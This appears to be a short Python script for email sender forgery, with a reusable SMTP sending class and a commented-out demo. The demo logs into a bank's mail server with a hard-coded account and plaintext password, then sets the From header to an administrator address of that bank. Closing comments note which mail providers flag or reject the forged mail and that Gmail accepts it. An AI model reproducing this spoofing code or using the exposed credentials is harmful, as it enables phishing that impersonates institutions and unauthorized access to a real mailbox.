import smtplib
from email.header import Header
from email.mime.text import MIMEText


class SendMail(object):
    subject = 'Python email forgery'

    def __init__(self, smtp_server, sender_mail, sender_pass):
        self.smtp_server = smtp_server
        self.sender_mail = sender_mail
        self.sender_pass = sender_pass

    def send(self, receiver_mail, title, content):
        msg = MIMEText(title)
        msg['Subject'] = Header(self.subject, 'utf-8')
        msg['To'] = Header(receiver_mail)
        msg['From'] = Header(self.sender_mail)

        smtp = smtplib.SMTP()
        smtp.connect(self.smtp_server)
        smtp.login(self.sender_mail, self.sender_pass)
        smtp.sendmail(self.sender_mail, receiver_mail, msg.as_string())
        smtp.quit()


################真实信息################
# # 发送邮箱服务器
# smtpserver = 'mail.wzbank.cn'
# # 发送邮箱用户/密码
# real_sender = '05343@wzbank.cn'
# real_password = 'Wzllm1988'
#
# # 接收邮箱
# real_receiver = 'wy1407@wzbank.cn'
# # 发送邮件主题
#
#
# ################构造信息################
# # 编写HTML类型的邮件正文，可选HTML等改变格式
# msg = MIMEText('This is a forgery email !')
# msg['Subject'] = Header(subject, 'utf-8')
# msg['To'] = Header(real_receiver)
#
# # 伪造部分
# forgery_sender = "admin@wzbank.cn"
# msg['From'] = Header(forgery_sender)
#
# # 连接发送邮件
# smtp = smtplib.SMTP()
# smtp.connect(smtpserver)
# smtp.login(real_sender, real_password)
# smtp.sendmail(real_sender, real_receiver, msg.as_string())
# smtp.quit()
#
# # 网易邮箱和QQ邮箱都会显示是谁代发
# # outlook会直接拒收
# # gmail会发送成功，并且成功伪造
